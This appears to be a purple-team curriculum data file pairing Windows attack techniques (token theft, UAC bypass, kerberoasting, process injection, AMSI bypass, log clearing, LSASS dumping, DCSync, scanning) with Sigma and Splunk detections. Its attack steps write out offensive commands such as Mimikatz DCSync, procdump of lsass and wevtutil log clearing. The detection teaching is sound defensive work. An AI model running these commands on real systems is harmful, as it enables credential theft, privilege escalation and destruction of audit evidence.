Sysmon Event 11 (new service binary file creation)
detection_rules: Sigma: proc_creation_win_new_service_creation — sc.exe create or New-Service with suspicious paths
Sigma: win_system_service_creation — Windows Event 7045 with non-standard service binary path
Splunk: index=windows EventCode=7045 | where NOT match(ServiceFileName (?i)(System32|Program Files))

topics.gap_analysis: Event 7045 only fires for services created via the SCM API. Direct registry modification of the Services key wont generate 7045 — requires registry monitoring. Gap: attackers who modify existing service binaries or hijack service DLL paths can evade service-creation detection.
drills: Create a malicious Windows service. Verify Event 7045 fires. Then try creating a service via direct registry modification — does your detection catch it? Write detections for both methods.
common_mistakes: Only monitoring for new services not modified ones
Not checking service binary paths against allowlists
Forgetting to correlate service creation with the creating process for attribution

modules.title: Privilege Escalation — Token Manipulation & UAC Bypass vs. Privilege Monitoring
modules.objective: Learner can execute privilege escalation techniques and build detections using Windows privilege audit events and process monitoring.

topics.title: Access Token Manipulation (T1134) vs. Privilege Usage Monitoring
concepts: Windows access tokens: security context objects containing user SID group memberships and privileges

Token manipulation sub-techniques: Token Impersonation/Theft (T1134.001) Create Process with Token (T1134.002) Make and Impersonate (T1134.003) Parent PID Spoofing (T1134.004) SID-History Injection (T1134.005)
Attackers steal tokens from SYSTEM or admin processes to escalate privileges
Key privileges: SeDebugPrivilege (access any process) SeAssignPrimaryTokenPrivilege SeImpersonatePrivilege
JuicyPotato/RoguePotato/PrintSpoofer exploit SeImpersonatePrivilege to escalate from service account to SYSTEM
key_facts: SeDebugPrivilege allows a process to open any other process (including SYSTEM processes) for full access
Windows Event 4672 (Special Privileges Assigned to New Logon) fires when admin/elevated privileges are granted
Windows Event 4703 (Token Right Adjusted) fires when a privilege is enabled — key for SeDebugPrivilege detection
Windows Event 4688 with Elevated Token field = Yes indicates the process ran elevated

attack_side.technique: Manipulate Windows access tokens to escalate from standard user to SYSTEM or domain admin
attack_steps: Obtain SeImpersonatePrivilege (common with service accounts like IIS SQL WinRM)
Exploit with PrintSpoofer or RoguePotato to get SYSTEM token
Steal token: OpenProcessToken on target process (lsass.exe or winlogon.exe for SYSTEM)
Create process with stolen token: CreateProcessWithTokenW or CreateProcessAsUserW
Result: new process running as SYSTEM or target user

defense_side.what_to_detect: Detect privilege enabling (SeDebugPrivilege) token theft (opening other processes tokens) and process creation with elevated/impersonated tokens
logs: Windows Security Event 4703 (Token Right Adjusted Events — privilege enabled)
Windows Security Event 4672 (Special Privileges Assigned to New Logon)
Sysmon Event 10 (Process Access) — suspicious handle requests to lsass.exe or winlogon.exe
Windows Security Event 4688 with Elevated=Yes flag
Sysmon Event 1 (process creation) with unusual user context vs parent
detection_rules: Sigma: win_privilege_escalation_sedebugprivilege — Event 4703 with SeDebugPrivilege enabled by non-system process
Splunk: index=windows EventCode=4703 PrivilegeList=SeDebugPrivilege | where NOT match(Image (?i)(svchost|csrss|MsMpEng))
Sigma: win_token_manipulation — Event 4688 where SubjectUserName differs from expected for parent process lineage
tools: Windows Advanced Audit Policy (Privilege Use > Audit Sensitive Privilege Use)
controls: Least privilege (dont grant SeImpersonatePrivilege to service accounts)

topics.gap_analysis: Event 4703 generates high volume — many legitimate processes enable privileges. Must filter to SeDebugPrivilege specifically and exclude known-good processes. Gap: Parent PID Spoofing (T1134.004) is very hard to detect as the spoofed parent looks legitimate. Token impersonation via API calls doesnt always generate obvious log events.
drills: Use PrintSpoofer to escalate from a service account to SYSTEM. Check: did Event 4703 fire for SeDebugPrivilege? Did Sysmon Event 10 fire for process access? Write a detection combining 4703 + process lineage anomaly.
common_mistakes: Not enabling Audit Sensitive Privilege Use (needed for Event 4703)
Alerting on all privilege usage (too noisy) — focus on SeDebugPrivilege and SeAssignPrimaryTokenPrivilege
Not correlating privilege events with process creation events for context

topics.title: UAC Bypass (T1548.002) vs. Elevation Monitoring
concepts: User Account Control (UAC): Windows feature requiring elevation consent for admin actions
UAC bypass: techniques that allow a process running in medium IL (with admin token available) to execute in high IL without consent prompt
Common UAC bypass methods: auto-elevate binaries (fodhelper computerdefaults sdclt) COM hijacking DLL side-loading ICMLuaUtil
UAC bypass requires the user to already be in the local Administrators group
Detection: monitor for auto-elevate binaries executing with unexpected command lines or loading unsigned DLLs
key_facts: UAC bypass is only relevant when the user is a local admin — standard users cant bypass (they need credentials)
fodhelper.exe auto-elevates and reads registry keys that can be hijacked to execute arbitrary commands
UAC bypass techniques change with each Windows update — maintain a current list (UACME project has 100+ methods)
Sysmon Event 1 can detect auto-elevate binaries spawning unexpected child processes

attack_side.technique: Bypass UAC consent prompt to execute code with elevated privileges using auto-elevate binaries
attack_steps: Verify current user is in local Administrators group (UAC bypass prerequisite)
Select UAC bypass method (e.g., fodhelper registry hijack)
Set registry key: HKCU\Software\Classes\ms-settings\Shell\Open\command = cmd.exe
Launch fodhelper.exe (auto-elevates) which reads the registry and executes the command elevated
New process runs in high integrity level without UAC prompt

defense_side.what_to_detect: Detect auto-elevate binaries (fodhelper sdclt computerdefaults) spawning unexpected child processes or loading unsigned DLLs
logs: Sysmon Event 1 (Process Creation) — monitor for fodhelper.exe sdclt.exe computerdefaults.exe spawning cmd/powershell
Sysmon Event 7 (Image Loaded) — unsigned DLLs loaded by auto-elevate binaries
Sysmon Event 13 (Registry Value Set) — modifications to HKCU\Software\Classes\ keys used in bypass
Windows Security Event 4688 with Elevated Token field
detection_rules: Sigma: proc_creation_win_uac_bypass_fodhelper — fodhelper.exe spawning cmd.exe or powershell.exe
Sigma: proc_creation_win_uac_bypass_sdclt — sdclt.exe spawning unexpected child processes
Sigma: registry_event_uac_bypass — registry modifications to HKCU\Software\Classes\ms-settings or similar
controls: UAC set to Always Notify (highest level)

topics.gap_analysis: Setting UAC to Always Notify prevents many bypass methods but is disruptive. New bypass methods are discovered regularly (UACME project). Gap: many organizations run UAC at default level which allows auto-elevate bypasses. Detection must focus on auto-elevate binary child process anomalies.
drills: Execute 3 different UAC bypass methods from UACME. For each verify Sysmon Event 1 captures the auto-elevate binary to child process chain. Write Sigma rules. Then set UAC to Always Notify and confirm the bypasses are blocked.
common_mistakes: Thinking UAC is a security boundary — its a convenience feature and bypassable for admin users
Not monitoring auto-elevate binary behavior specifically
Forgetting that UAC bypass is irrelevant for non-admin users

topics.title: Kerberoasting (T1558.003) vs. Kerberos Request Monitoring
concepts: Kerberoasting: request Kerberos service tickets (TGS) for service accounts then crack them offline to recover passwords
Any authenticated domain user can request TGS tickets for any SPN-registered service — this is legitimate Kerberos behavior
The attack: request tickets offline then crack the encrypted ticket offline (no domain interaction after initial request)
Detection challenge: ticket requests are normal Kerberos traffic — must look for volume anomalies and encryption type downgrades
Key indicator: requests for RC4-HMAC tickets (weak encryption) when AES is available
key_facts: Service accounts with SPNs are vulnerable — especially those with weak passwords
RC4-HMAC (encryption type 0x17 / 23) tickets are crackable with hashcat in minutes; AES-256 takes much longer
Windows Event 4769 (Kerberos Service Ticket Request) logs every TGS request including encryption type
Rubeus kerberoast can request all TGS tickets in one batch generating a spike in 4769 events

attack_side.technique: Request Kerberos service tickets for all SPN-registered accounts and crack them offline to recover service account passwords
attack_steps: Enumerate SPN-registered accounts: setspn -T domain -Q */* or PowerView Get-NetUser -SPN
Request TGS tickets: Rubeus kerberoast or Invoke-Kerberoast (requests tickets for all service accounts)
Export tickets in hashcat crackable format (Kerberos 5 etype 23)
Crack offline: hashcat -m 13100 hashes.txt wordlist (RC4-HMAC mode)
Use recovered credentials for lateral movement or privilege escalation

defense_side.what_to_detect: Detect anomalous Kerberos TGS request patterns: bulk requests RC4 encryption downgrade requests from unusual hosts
logs: Windows Security Event 4769 (Kerberos Service Ticket Request) — with TicketEncryptionType field
Windows Security Event 4768 (Kerberos Authentication Ticket Request)
Sysmon Event 1 (process executing Kerberoasting tools)
PowerShell Event 4104 (script blocks containing Kerberoast-related patterns)
detection_rules: Sigma: win_kerberoasting_rc4 — Event 4769 with TicketEncryptionType=0x17 (RC4-HMAC)
Sigma: win_kerberoasting_spn_requests — multiple 4769 events for different SPNs from same source in short timeframe
Splunk: index=windows EventCode=4769 TicketEncryptionType=0x17 | stats count by ClientAddress | where count > 10
Sigma: posh_ps_kerberoasting_keywords — Event 4104 containing Kerberoast/Request-SPNTicket patterns
controls: Group Managed Service Accounts (gMSA) with automatic rotation
Disable RC4 in favor of AES

topics.gap_analysis: Kerberoasting is hard to detect because TGS requests are normal. Volume-based detection catches bulk requests but misses targeted single requests. RC4 downgrade detection is effective only if the environment supports AES (then RC4 requests are suspicious). Gap: AES Kerberoasting (etype 18) is much harder to detect and to crack.
drills: Run Rubeus kerberoast in lab. Examine Event 4769 — check encryption types volume source. Write a Sigma rule for RC4 downgrade + volume spike. Set up gMSA and show how it mitigates the attack.
common_mistakes: Alerting on every 4769 event (extremely noisy) — must filter for anomalies
Not distinguishing RC4 (crackable) from AES (not practically crackable) tickets
Forgetting that AS-REP roasting (T1558.004) is a different but related attack targeting accounts with DONT_REQ_PREAUTH

modules.title: Defense Evasion — Injection, AMSI Bypass & Log Clearing vs. EDR & Integrity Monitoring
modules.objective: Learner can execute defense evasion techniques and build detections that catch them even when traditional logs are cleared or tampered.

topics.title: Process Injection (T1055) vs. EDR Memory Scanning & Sysmon
concepts: Process injection: executing code in the address space of another (legitimate) process to evade detection

Sub-techniques: DLL Injection (T1055.001) PE Injection (T1055.002) Thread Hijacking (T1055.003) APC Injection (T1055.004) Process Hollowing (T1055.012) Process Doppelganging (T1055.013) Extra Window Memory (T1055.011)
Classic injection chain: VirtualAllocEx then WriteProcessMemory then CreateRemoteThread
EDR memory scanning: scanning process memory regions for injected code hooks and anomalies
Sysmon Events: 8 (CreateRemoteThread) 10 (ProcessAccess) 7 (ImageLoaded) 25 (ProcessTampering)
key_facts: Sysmon Event 8 (CreateRemoteThread) fires when one process creates a thread in another — classic injection indicator
Sysmon Event 10 (ProcessAccess) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) or 0x143A indicates suspicious memory access
Sysmon Event 25 (ProcessTampering) fires when in-memory image differs from on-disk image (hollowing indicator) — Sysmon 13+
EDRs use API hooking (ntdll.dll hooks) and memory scanning to detect injection in real-time

attack_side.technique: Inject malicious code into a legitimate process (explorer.exe svchost.exe) to hide from process-based detection
attack_steps: Open target process: OpenProcess(PROCESS_ALL_ACCESS FALSE targetPID)
Allocate memory: VirtualAllocEx(handle NULL size MEM_COMMIT PAGE_EXECUTE_READWRITE)
Write shellcode: WriteProcessMemory(handle allocatedMemory shellcode size NULL)
Execute: CreateRemoteThread(handle NULL 0 allocatedMemory NULL 0 threadId)
Malicious code now runs in the context of the legitimate process

defense_side.what_to_detect: Detect cross-process memory operations: remote thread creation suspicious process access DLL loading anomalies and memory-disk image mismatch
logs: Sysmon Event 8 (CreateRemoteThread) — source creates thread in target process
Sysmon Event 10 (ProcessAccess) — suspicious access masks (0x1FFFFF 0x143A 0x0040)
Sysmon Event 7 (ImageLoaded) — DLLs loaded from unusual paths into system processes
Sysmon Event 25 (ProcessTampering) — in-memory image mismatch (hollowing detection)
detection_rules: Sigma: create_remote_thread_into_system_process — Event 8 targeting svchost.exe explorer.exe lsass.exe from non-standard source
Sigma: sysmon_access_credentials_via_lsass_memory — Event 10 with TargetImage lsass.exe and GrantedAccess containing PROCESS_VM_READ
Splunk: index=sysmon EventCode=8 SourceImage!=TargetImage | where match(TargetImage (svchost|explorer|lsass)) and NOT match(SourceImage (csrss|services|MsMpEng))
Splunk: index=sysmon EventCode=25 — any ProcessTampering event is suspicious
controls: EDR with API hooking and memory scanning

topics.gap_analysis: Reflective DLL injection loads from memory without touching disk bypassing ImageLoaded (Event 7) detection. Process doppelganging uses NTFS transactions to evade file-based detection. Gap: legitimate software (AV debuggers management tools) also performs cross-process operations creating false positives. Must build good allowlists. Newer injection techniques (Module Stomping Extra Window Memory) may not generate standard Sysmon events.
drills: Execute 4 injection techniques (DLL injection process hollowing APC injection reflective DLL). For each: identify which Sysmon events fire (8 10 7 25). Write Sigma rules for each pattern. Then run PE-sieve to find injected code in memory.
common_mistakes: Not deploying Sysmon Event 8 or 10 (many configs omit them for performance)
Not filtering known-good cross-process activity (AV scanners management agents)
Relying only on process creation events and missing memory-level indicators

topics.title: AMSI Bypass & Tool Tampering (T1562.001) vs. Tamper Protection
concepts: AMSI bypass: patching AmsiScanBuffer in memory to make AMSI always return clean enabling in-memory malware execution
AV/EDR tampering: disabling Windows Defender adding path exclusions stopping security services unregistering EDR drivers
Windows Defender Tamper Protection: prevents non-Microsoft processes from modifying Defender settings via registry/API
Tamper Protection blocks: stopping Microsoft Defender service adding exclusions disabling real-time protection turning off cloud-delivered protection
Detection of tampering: monitor for security tool service stoppage exclusion additions and AMSI-related registry changes
key_facts: Tamper Protection is enabled by default on Windows 10 1903+ — prevents Set-MpPreference exclusions via PowerShell
AMSI bypass code itself is captured in Script Block Logging (Event 4104) even though it succeeds in bypassing AMSI
Sysmon Event 1 can detect known AMSI bypass one-liners in command line arguments
Event 5001 (Windows Defender) indicates real-time protection was disabled

attack_side.technique: Bypass or disable security tools (AMSI Defender EDR) to execute payloads undetected
attack_steps: AMSI bypass: patch AmsiScanBuffer function in memory to return success without scanning
Alternative: force AMSI error via reflection (set amsiInitFailed = true)
Defender bypass: attempt to add exclusions disable real-time protection or stop the service
EDR evasion: unhook ntdll.dll use direct syscalls or use vulnerable signed drivers (BYOVD) to kill EDR process
With defenses bypassed: execute in-memory payloads without detection

defense_side.what_to_detect: Detect AMSI bypass attempts in script block logs Defender tampering attempts EDR driver unload attempts
logs: PowerShell Event 4104 (Script Block) — captures AMSI bypass code even when bypass succeeds
Windows Defender Event 5001 (real-time protection disabled) 5007 (anti-malware configuration changed)
Sysmon Event 1 — known AMSI bypass patterns in command line
Sysmon Event 6/7 — unsigned driver loading (BYOVD attacks)
Sysmon Event 4 (driver/service state change) — security service stopped
detection_rules: Sigma: posh_ps_amsi_bypass — Event 4104 with AmsiScanBuffer/amsiInitFailed/AMSIResult patterns
Sigma: win_defender_disabled — Event 5001 or Set-MpPreference -DisableRealtimeMonitoring
Sigma: win_defender_exclusion_added — Set-MpPreference -ExclusionPath added outside of deployment tools
Sigma: sysmon_unsigned_driver — Event 6 with unsigned or vulnerable driver loading
controls: Driver block rules (Microsoft Vulnerable Driver Blocklist)

topics.gap_analysis: Direct syscalls bypass EDR API hooks (user-mode hooks in ntdll.dll). BYOVD attacks load a vulnerable signed driver to kill EDR from kernel space. Gap: once the EDR is killed or unhooked it stops generating telemetry. Must have redundant logging (Sysmon independent of EDR) and alert on the tampering event itself immediately.
drills: Execute an AMSI bypass. Confirm Event 4104 captured the bypass code. Write a Sigma rule. Then attempt to disable Defender — verify Tamper Protection blocks it and Event 5007 fires. Attempt a BYOVD attack with a vulnerable driver — verify Sysmon Event 6 catches it.
common_mistakes: Not alerting on AMSI bypass attempts in Event 4104 — this is a high-fidelity signal
Disabling Tamper Protection for troubleshooting and forgetting to re-enable
Relying solely on EDR for detection — if EDR is tampered you are blind

topics.title: Clearing Event Logs (T1070.001) vs. Log Integrity & Forwarding
concepts: Clearing Windows event logs: wevtutil cl Security / wevtutil cl System — erases audit trail
Attackers clear logs to cover their tracks after achieving objectives
Windows Event 1102 (audit log cleared) fires BEFORE the Security log is cleared — it is logged in the Security log itself
Log forwarding to centralized SIEM means clearing local logs doesnt destroy the evidence
Log integrity monitoring: detect gaps in log streams that indicate tampering
key_facts: Event 1102 (The audit log was cleared) is the primary detection for Security log clearing
System Event 104 (Event log was cleared) fires when System/Application logs are cleared
PowerShell Event 4104 captures Clear-EventLog or wevtutil cl commands
Clearing logs requires admin privileges — a non-admin clearing logs is highly suspicious

attack_side.technique: Clear Windows event logs to remove evidence of attacker activity and hinder incident response
attack_steps: Gain administrative privileges (prerequisite for clearing Security log)
Clear Security log: wevtutil cl Security or Clear-EventLog -LogName Security
Clear other relevant logs: System Application PowerShell Sysmon
Alternative: selectively delete specific events using techniques that modify the .evtx file directly
Result: forensic trail destroyed or partially obscured

defense_side.what_to_detect: Detect log clearing via Event 1102/104 and detect log gaps via SIEM log integrity monitoring
logs: Windows Security Event 1102 (The audit log was cleared) — fires in Security log before clearing
Windows System Event 104 (Event log was cleared)
PowerShell Event 4104 (Clear-EventLog or wevtutil cl in script blocks)
Sysmon Event 1 (wevtutil.exe with cl argument)
detection_rules: Sigma: win_eventlog_cleared — Event 1102 or 104 with SubjectUserName
Splunk: index=windows EventCode=1102 OR EventCode=104 — alert on any log clearing event
SIEM log gap detection: alert when expected log source stops sending (log stream monitoring)
Sigma: proc_creation_win_wevtutil_clearing — wevtutil.exe with cl argument
tools: EDR (stores telemetry independently of local logs)
controls: Centralized log forwarding (logs leave the host immediately)
Windows Event Collector (WEF) for enterprise log collection

topics.gap_analysis: Event 1102 only fires for the Security log — clearing other logs may not generate an alert. Advanced techniques (Phantom DLL kernel-level .evtx manipulation) can clear logs without generating Event 1102. Gap: if logs arent forwarded to a central SIEM in real-time clearing local logs destroys evidence permanently.
drills: Clear the Security log. Verify Event 1102 fires (it should appear in the log before its cleared). Set up real-time alerting on 1102. Then check if your SIEM detects the log stream gap from the affected host. Demonstrate that forwarded logs survive local clearing.
common_mistakes: Not forwarding logs in real-time — batch forwarding means clearing logs between batches destroys evidence
Only monitoring Event 1102 (Security) and missing System/Application log clearing (Event 104)
Not alerting on wevtutil.exe usage in general — clearing logs outside of maintenance windows is suspicious

topics.title: Masquerading (T1036) vs. Process Name & Path Monitoring
concepts: Masquerading: renaming malicious binaries or processes to mimic legitimate system processes
Techniques: renaming malware as svchost.exe placing binaries in System32 to mimic legitimate locations
Process lineage: legitimate svchost.exe is always spawned by services.exe — a svchost.exe spawned by cmd.exe is suspicious
Signing status: legitimate system binaries are Microsoft-signed — masquerading binaries are often unsigned or differently signed
Detection: compare process name path parent process and digital signature against known-good baselines
key_facts: Legitimate svchost.exe always runs from C:\Windows\System32\ and is spawned by services.exe
Sysmon Event 1 includes process path parent process and hash — enables full masquerading detection
Signing differences can be detected: legitimate Windows binaries have specific certificate chains
Double extensions (.pdf.exe) and RTL override are classic masquerading techniques

attack_side.technique: Rename malicious executables to mimic legitimate system binaries and run them from system directories
attack_steps: Copy payload to C:\Windows\System32\svchost.exe (requires admin) or C:\Users\Public\svchost.exe
Execute with misleading name — blends into process list
Alternative: use spaces in names (svchost .exe) right-to-left override or parent PID spoofing
Alternative: place payload in a path that looks legitimate (C:\Windows\Update\svchost.exe)
tools: Cobalt Strike (spawnto and process inject settings)

defense_side.what_to_detect: Detect processes with system-process names running from non-standard paths with unexpected parents or unsigned
logs: Sysmon Event 1 (Process Creation) — includes Image (full path) ParentImage and hashes
Windows Security Event 4688 with command line and process path
Sysmon Event 7 (Image Loaded) — DLLs loaded by masqueraded processes
Sysmon Event 1 with OriginalFileName field (Sysmon captures original filename even if renamed)
detection_rules: Sigma: proc_creation_win_svchost_from_non_system_path — Image contains svchost.exe but NOT from System32
Sigma: proc_creation_win_svchost_wrong_parent — svchost.exe with parent other than services.exe
Splunk: index=sysmon EventCode=1 Image=*svchost.exe | where NOT match(Image (?i)System32\svchost) OR NOT match(ParentImage (?i)services.exe)
Sigma: proc_creation_win_unsigned_binary_renamed — OriginalFileName field mismatch with Image name

topics.gap_analysis: Sysmons OriginalFileName field (from PE version resource) helps detect renamed binaries but attackers can modify PE resources to match. Parent process checking is effective but parent PID spoofing can evade it. Gap: many orgs dont check process signatures at runtime only at file-level scanning time.
drills: Copy a benign payload as svchost.exe to a non-standard location and execute it. Verify Sysmon Event 1 flags the wrong path/parent. Write Sigma rules for svchost path/parent validation. Check OriginalFileName field to confirm it differs from the real svchost.exe.
common_mistakes: Only checking process name not full path or parent process
Not using Sysmons OriginalFileName field (available since Sysmon 7.01)
Not maintaining a baseline of legitimate parent-child process relationships

modules.title: Credential Access — LSASS Dumping & Kerberoasting vs. Credential Guard
modules.objective: Learner can execute credential theft attacks and configure the full defensive stack: LSASS protection, Credential Guard, Sysmon monitoring, and EDR detection.

topics.title: LSASS Memory Dumping (T1003.001) vs. LSASS Protection & Credential Guard
concepts: LSASS (Local Security Authority Subsystem Service): stores credentials in memory including NTLM hashes Kerberos tickets and plaintext passwords
Credential dumping: reading LSASS memory to extract credentials (Mimikatz sekurlsa::logonpasswords)
Windows Defender Credential Guard: virtualization-based security (VBS) that isolates credential secrets in a secure enclave
LSASS Protected Process Light (PPL): prevents non-protected processes from reading LSASS memory
RunAsPPL registry setting: enables PPL for lsass.exe
key_facts: Sysmon Event 10 (ProcessAccess) with TargetImage lsass.exe is the primary LSASS access detection
GrantedAccess mask 0x1410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) is common for credential dumping
Credential Guard stores secrets in LSAISO (isolated LSAS) process that LSASS cannot access directly
Event 4656 (handle requested) and 4663 (object accessed) can audit LSASS access if SACL is configured

attack_side.technique: Dump LSASS process memory to extract credentials including NTLM hashes Kerberos tickets and plaintext passwords
attack_steps: Obtain admin/SYSTEM privileges (required to access LSASS memory)
Method 1: Mimikatz sekurlsa::logonpasswords (reads LSASS in-process)
Method 2: Create LSASS minidump: procdump -ma lsass.exe lsass.dmp (then parse offline with Mimikatz/pypykatz)
Method 3: Direct memory copy via comsvcs.dll MiniDump (rundll32 comsvcs.dll MiniDump)
Extract credentials: NTLM hashes (for Pass-the-Hash) Kerberos tickets (for Pass-the-Ticket) plaintext passwords

defense_side.what_to_detect: Detect any process accessing LSASS memory for read operations — use Sysmon Event 10 with lsass.exe as target
logs: Sysmon Event 10 (ProcessAccess) — TargetImage lsass.exe with suspicious GrantedAccess masks
Windows Security Event 4656 (Handle Requested) on lsass.exe — if SACL auditing configured
Windows Security Event 4663 (Object Access) — if object access auditing on LSASS
Sysmon Event 11 (FileCreate) — lsass.dmp or similar dump file creation
Windows Defender Event 1116/1117 — Mimikatz detection
detection_rules: Sigma: sysmon_mimikatz_detection_lsass_access — Event 10 with TargetImage lsass.exe and GrantedAccess containing 0x10 or 0x1410
Splunk: index=sysmon EventCode=10 TargetImage=*lsass.exe | where match(GrantedAccess (?i)0x10) | where NOT match(SourceImage (?i)(svchost|csrss|MsMpEng|wininit))
Sigma: file_create_lsass_dump — Event 11 with filename matching *lsass*.dmp or *.dmp in temp directories

topics.gap_analysis: Credential Guard can be bypassed with techniques like DumpGuard (abusing Remote Credential Guard protocol). PPL can be bypassed with vulnerable signed drivers (BYOVD). Some legitimate tools (AV scanning management agents) access LSASS creating false positives. Gap: offline LSASS dump parsing (pypykatz) is undetectable after the fact — must catch the dump creation not the parsing.
drills: Execute 3 LSASS dumping methods (Mimikatz procdump comsvcs.dll). For each verify Sysmon Event 10 fires with appropriate GrantedAccess mask. Write Sigma rules. Then enable Credential Guard and PPL — show how Mimikatz fails. Attempt a BYOVD bypass and detect it via driver loading events.
common_mistakes: Not configuring Sysmon Event 10 with LSASS-specific filters (too noisy without filtering)
Relying only on PPL without Credential Guard (PPL can be bypassed)
Not building allowlists for legitimate LSASS access (AV management tools)

topics.title: Credentials in Files (T1552) vs. Credential Store Monitoring
concepts: Attackers search for credentials stored in files: configuration files scripts with embedded passwords SSH keys browser-stored passwords
Common locations: web.config app.config unattend.xml Group Policy Preferences (cpassword) .bash_history .ssh/id_rsa
Browser credential stores: Chrome Login Data (SQLite) Firefox logins.json Windows Credential Manager
Detection: monitor for bulk file access patterns credential store access and credential file content
Group Policy Preferences (GPP) passwords: AES-256 key is published by Microsoft making stored cpasswords decryptable
key_facts: GPP cpassword can be decrypted with Microsoft published AES key — any SYSVOL XML file with cpassword is vulnerable
Chrome stores passwords in %LocalAppData%\Google\Chrome\User Data\Default\Login Data (SQLite encrypted with DPAPI)
Sysmon Event 11 (FileCreate) can detect access to known credential file paths
Sysmon Event 3 (Network Connection) from password-cracking tools indicates exfiltration

attack_side.technique: Search the file system for stored credentials including configuration files browser stores and SSH keys
attack_steps: Enumerate credential file locations: findstr /si password *.txt *.xml *.config *.ini
Check Group Policy Preferences: Get-GPPPassword (decrypts cpassword in SYSVOL XML files)
Extract browser credentials: SharpChrome/SharpFox or LaZagne
Collect SSH keys: copy ~/.ssh/id_rsa check SSH agent
Parse Windows Credential Manager: cmdkey /list or vaultcmd

defense_side.what_to_detect: Detect bulk file access patterns credential store database access and known credential-theft tool execution
logs: Sysmon Event 11 (FileCreate) — access to credential file types (.config .xml with passwords)
Sysmon Event 1 (Process Creation) — known credential theft tools (LaZagne SharpChrome Seatbelt)
Sysmon Event 10 (ProcessAccess) — access to browser credential databases
Windows Security Event 4663 (Object Access) — file access auditing on credential files
Sysmon Event 3 (Network Connection) — data exfiltration from credential theft tools
detection_rules: Sigma: proc_creation_win_lazagne_execution — LaZagne or known credential theft tool execution
Sigma: proc_creation_win_findstr_password — findstr.exe with password argument (credential search)
Sigma: file_create_win_credentials_in_files — access to web.config unattend.xml .ssh/id_rsa
Splunk: index=sysmon EventCode=11 TargetFilename=*web.config OR TargetFilename=*unattend.xml OR TargetFilename=*.kdbx
controls: Credential storage in enterprise vaults (not files)
File access auditing on sensitive directories

topics.gap_analysis: Credential theft from files is hard to detect because file reads are normal activity. Bulk access patterns (reading many files quickly searching with findstr for password) are more indicative than individual file access. Gap: DPAPI-protected credentials are only accessible in the user context — if the attacker runs as that user DPAPI provides no protection.
drills: Run Seatbelt and LaZagne to collect credentials. Identify which Sysmon events fire. Write Sigma rules for credential-theft tool execution. Then implement GPP password cleanup and show that Get-GPPPassword finds nothing.
common_mistakes: Not auditing access to credential files (web.config unattend.xml)
Leaving GPP passwords in SYSVOL (should be removed after MS14-025 patch)
Not monitoring for known credential-theft tools by hash/name

topics.title: DCSync (T1003.006) vs. Domain Controller Monitoring
concepts: DCSync: simulates the behavior of a Domain Controller to request password replication data via DRSUAPI
Requires Replicating Directory Changes and Replicating Directory Changes All privileges (normally only DCs have these)
Attackers with these privileges (Domain Admins or accounts with delegated replication rights) can dump all domain password hashes
Mimikatz lsadump::dcsync can dump any user hash including krbtgt (for Golden Ticket attacks)
Detection: monitor for replication requests (DRSUAPI) from non-DC systems
key_facts: DCSync uses the IDL_DRSGetNCChanges RPC method via the DRSUAPI interface
Only Domain Controllers should send replication requests — any other system doing so is suspicious
Windows Event 4662 (object operation) logs directory service replication access
DCSync can dump krbtgt hash which enables Golden Ticket creation (T1558.001)

attack_side.technique: Use DRSUAPI replication to extract password hashes for any/all domain accounts from a Domain Controller
attack_steps: Obtain an account with replication privileges (Domain Admin or account with DS-Replication-Get-Changes-All)
Execute Mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt
Mimikatz sends DRSUAPI replication request to a DC receives password hash
Use extracted hashes: krbtgt for Golden Ticket Domain Admin hashes for lateral movement
Alternative: Impacket secretsdump.py -just-dc for automated DCSync

defense_side.what_to_detect: Detect directory service replication requests from non-Domain Controller systems via Event 4662
logs: Windows Security Event 4662 (object operation on directory service) with replication GUIDs
GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
GUID 89e95b76-444d-4c62-991a-0facbeda640c (DS-Replication-Get-Changes-In-Filtered-Set)
detection_rules: Sigma: win_dcsync — Event 4662 from non-DC computer with replication GUIDs
Splunk: index=windows EventCode=4662 Properties=*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* | where NOT match(SourceComputerName (?i)DC-)
Sigma: win_dcsync_mimikatz — Event 4662 with DRSUAPI replication from unexpected source
tools: Windows DC audit logging (Directory Service Access)
Microsoft Defender for Identity (automatic DCSync detection)

topics.gap_analysis: DCSync is highly effective because its a legitimate replication protocol. Detection must focus on the SOURCE of the request — only DCs should send replication requests. Gap: if an attacker compromises a DC they can DCSync from that DC without triggering source-based alerts. Must also monitor for unusual replication volume and timing.
drills: Execute Mimikatz DCSync from a non-DC system. Verify Event 4662 fires with replication GUIDs. Write a Sigma rule filtering for non-DC sources. Then demonstrate Golden Ticket creation with the extracted krbtgt hash.
common_mistakes: Not auditing Directory Service replication (Event 4662 requires SACL configuration on the domain)
Only monitoring one replication GUID — must monitor all three
Not implementing Tier 0 admin model (too many accounts with replication privileges)

modules.title: Discovery & Lateral Movement — Scanning, Pass-the-Hash & RDP vs. Network Analytics
modules.objective: Learner can perform network discovery and lateral movement techniques and build detections using Windows logon events, Sysmon, and network analytics.

topics.title: Network Service Discovery (T1046) vs. Network Behavioral Analytics
concepts: Network scanning: enumerating open ports and services across the network to find attack targets
Common tools: nmap masscan netexec (formerly CrackMapExec) Nmap NSE scripts
Internal scanning is a strong indicator of post-compromise activity — legitimate IT scanning is scheduled and from known scanners
Detection: port scan detection (many connections to many ports from single source) abnormal scanning times/patterns
Zeek network monitoring captures all connection metadata for analysis
key_facts: nmap -sS (SYN scan) generates thousands of SYN packets without completing handshakes
Zeek conn.log captures every connection with source/destination/port/duration/bytes
Logon failures (Event 4625) spike during brute-force and scanning activity
RITA (Real Intelligence Threat Analytics) analyzes Zeek logs for beaconing scanning and DNS tunneling

attack_side.technique: Scan the internal network to identify open ports services and potential lateral movement targets
attack_steps: Port scan: nmap -sS -p- 10.0.0.0/24 (scan all ports on subnet)
Service identification: nmap -sV target (identify service versions)
Enumerate shares: netexec smb 10.0.0.0/24 (find SMB shares)
Enumerate users: netexec smb target --users (domain user enumeration)
Identify vulnerabilities: nmap --script vuln target

defense_side.what_to_detect: Detect port scanning patterns rapid connection attempts to multiple hosts/ports and brute-force authentication
logs: Zeek conn.log — connection metadata for port scan pattern detection
Windows Security Event 4625 (failed logon) — brute-force detection
Firewall logs — connection attempts to multiple internal hosts
Sysmon Event 3 (Network Connection) — process initiating many connections
IDS alerts (Suricata/Snort) — nmap signature detection
detection_rules: Zeek/RITA: beaconing and scanning detection from conn.log analysis
